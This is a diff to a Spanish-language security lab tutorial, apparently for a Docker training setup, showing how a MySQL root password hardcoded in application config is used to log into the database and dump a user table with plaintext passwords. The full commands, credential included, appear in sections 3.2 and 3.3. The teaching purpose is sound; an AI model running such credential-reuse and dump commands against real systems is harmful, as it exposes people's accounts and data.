@@ -14,9 +14,10 @@ Ahí está: `DB_CONFIG` tiene el usuario `root` y la contraseña de MySQL en tex
 
 ## 3.2 — Conectarse directo a MySQL con esa credencial
 
+El cliente de `mysql` tampoco hace falta instalarlo en tu máquina — está en `toolbox`, en la misma red que el contenedor de MySQL, así que le llega directo por nombre de servicio:
+
 ```bash
-MYSQL_IP=$(docker inspect $(docker ps -qf "name=mysql") --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
-mysql -h "$MYSQL_IP" -uroot -pmysecretpassword -e "SHOW DATABASES;"
+docker compose exec toolbox mysql -h mysql -uroot -pmysecretpassword -e "SHOW DATABASES;"
 ```
 
 Acceso total al servidor, sin haber roto nada — solo leímos el código.
@@ -24,7 +25,7 @@ Acceso total al servidor, sin haber roto nada — solo leímos el código.
 ## 3.3 — ¿Qué se puede sacar?
 
 ```bash
-mysql -h "$MYSQL_IP" -uroot -pmysecretpassword -e "SELECT * FROM alumnos.usuarios;"
+docker compose exec toolbox mysql -h mysql -uroot -pmysecretpassword -e "SELECT * FROM alumnos.usuarios;"
 ```
 
 Con la contraseña de MySQL en la mano, la tabla `usuarios` —contraseñas en texto plano incluidas— queda totalmente expuesta. Ni siquiera hizo falta pasar por el login de la app.
